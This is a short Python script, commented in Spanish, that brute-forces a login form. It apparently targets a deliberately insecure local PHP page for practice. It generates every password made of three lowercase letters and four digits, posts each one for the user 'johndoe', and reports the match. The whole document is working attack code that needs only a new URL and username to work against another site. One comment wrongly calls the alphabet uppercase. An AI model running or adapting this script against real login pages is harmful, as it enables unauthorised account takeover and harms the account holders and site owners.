import itertools
import requests

url = "http://localhost:8080/login_inseguro.php"
username = "johndoe"

# Alfabeto en mayúsculas (ABC)
letters = "abcdefghijklmnopqrstuvwxyz"

# Generador de contraseñas: ABCxxxx
def password_generator():
    for letters_part in itertools.product(letters, repeat=3):
        for number in range(10000):
            yield f"{''.join(letters_part)}{number:04d}"

# Fuerza bruta
for password in password_generator():
    data = {
        "loginName": username,      # ojo: nombre del campo exacto según PHP
        "password": password
    }

    try:
        response = requests.post(url, data=data)
        text = response.text.strip()

        if "OK" in text:
            print(f"[+] Contraseña encontrada: {password}")
            break
        elif "Usuario no encontrado" in text:
            print("[!] El usuario no existe.")
            break  # opcional: detener si el usuario no existe

        print(f"[-] Probando: {password}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Error de conexión: {e}")
        break
